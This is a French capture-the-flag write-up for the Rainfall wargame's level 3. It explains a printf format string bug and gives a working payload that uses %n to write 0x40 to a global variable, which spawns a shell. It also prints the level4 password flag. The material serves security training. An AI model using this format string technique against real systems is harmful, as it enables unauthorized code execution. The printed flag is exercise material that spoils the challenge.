# Rainfall - Flag 3

---

## 🧠 Vulnérabilité exploitée

Mauvaise utilisation de `printf` avec la possibilité d’utiliser le format `%n`, qui écrit le nombre de caractères imprimés à une adresse arbitraire. Cela permet de modifier une valeur en mémoire sans fonction d’écriture explicite.

---

## 🔍 Analyse du binaire

La fonction `v()` lit une chaîne avec `fgets(buf, 512, stdin)` puis l’affiche sans formatage :

```c
printf(buf);
```

Ceci permet à un attaquant de spécifier ses propres formats, comme `%x` ou `%n`.

Dans le code assembleur, on remarque :

```asm
mov    0x804988c,%eax
cmp    $0x40,%eax
```

Si la valeur stockée à `0x804988c` vaut `0x40` (64 en décimal), `system("/bin/sh")` est exécuté.

---

## 🛠️ Construction du payload

### Objectif

* Écrire la valeur `0x40` à l’adresse `0x804988c` avec `%n`

### Payload utilisé

```bash
(python -c 'print("\x8c\x98\x04\x08" + "%64d%4$n")'; cat) | ./level3
```

**Détail :**

* `\x8c\x98\x04\x08` est l’adresse cible (little endian)
* `%64d` imprime 64 caractères
* `%4$n` écrit 64 à l’adresse fournie en 4e argument (stack)

---

## 🔮 Shell obtenu

```bash
whoami
# level4

cat /home/user/level4/.pass
# b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## ✅ Récapitulatif

* Exploitation d’une vulnérabilité *format string* via `printf(buf)`
* Utilisation de `%n` pour écrire `0x40` en mémoire
* Shell obtenu et flag récupéré
